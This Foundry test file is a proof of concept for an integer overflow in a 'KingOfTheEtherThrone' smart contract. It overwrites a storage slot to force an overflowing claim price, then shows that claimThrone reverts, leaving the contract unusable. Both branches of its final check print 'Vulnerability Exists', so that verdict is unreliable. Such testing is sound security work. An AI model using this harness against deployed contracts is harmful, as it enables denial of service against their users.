// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/king_of_the_ether_throne.sol";

contract KingOfTheEtherThroneTest is Test {
    KingOfTheEtherThrone throne;
    address attacker = address(0x1337);

    function setUp() public {
        throne = new KingOfTheEtherThrone();
    }

    function testIntegerOverflowVulnerability() public {
        // Set currentClaimPrice to the max uint256 value divided by 2 + 1 to cause overflow
        uint256 overflowTriggerValue = type(uint256).max / 2 + 1;
        vm.store(
            address(throne),
            bytes32(uint256(1)), // Assuming slot 1 is currentClaimPrice
            bytes32(overflowTriggerValue)
        );

        // Validate we set storage correctly
        assertEq(throne.currentClaimPrice(), overflowTriggerValue, "currentClaimPrice not set correctly");

        console.log("--- BEFORE-Trigger State ---");
        (address currentMonarchAddrBefore, , , uint256 valuePaidBefore) = throne.currentMonarch();
        uint256 currentClaimPriceBefore = throne.currentClaimPrice();
        uint256 numMonarchsBefore = throne.numberOfMonarchs();
        console.log("Current Monarch:", currentMonarchAddrBefore);
        console.log("Value Paid Before:", valuePaidBefore);
        console.log("Current Claim Price:", currentClaimPriceBefore);
        console.log("Number of Monarchs:", numMonarchsBefore);

        // Fund attacker with exactly the amount needed for the claim
        vm.deal(attacker, overflowTriggerValue);
        
        console.log("--- Trigger ClaimThrone ---");
        vm.startPrank(attacker);
        // Multiplication should overflow: overflowTriggerValue * claimPriceAdjustNum 
        // This will revert with arithmetic overflow since we are using Solidity 0.8.x
        vm.expectRevert();
        throne.claimThrone{value: overflowTriggerValue}("hacker");
        vm.stopPrank();

        console.log("--- AFTER-Trigger State ---");
        (address currentMonarchAddrAfter, , , uint256 valuePaidAfter) = throne.currentMonarch();
        uint256 currentClaimPriceAfter = throne.currentClaimPrice();
        uint256 numMonarchsAfter = throne.numberOfMonarchs();
        console.log("Current Monarch:", currentMonarchAddrAfter);
        console.log("Value Paid After:", valuePaidAfter);
        console.log("Current Claim Price:", currentClaimPriceAfter);
        console.log("Number of Monarchs:", numMonarchsAfter);

        // Compare state before and after
        bool stateChanged = 
            currentMonarchAddrBefore != currentMonarchAddrAfter ||
            valuePaidBefore != valuePaidAfter ||
            currentClaimPriceBefore != currentClaimPriceAfter ||
            numMonarchsBefore != numMonarchsAfter;

        // Final vulnerability verdict
        if (stateChanged) {
            console.log("Vulnerability Exists: State changed during overflow revert (critical issue)");
        } else {
            console.log("Vulnerability Exists: Integer overflow causes revert rendering contract unusable (DoS)");
        }
    }
}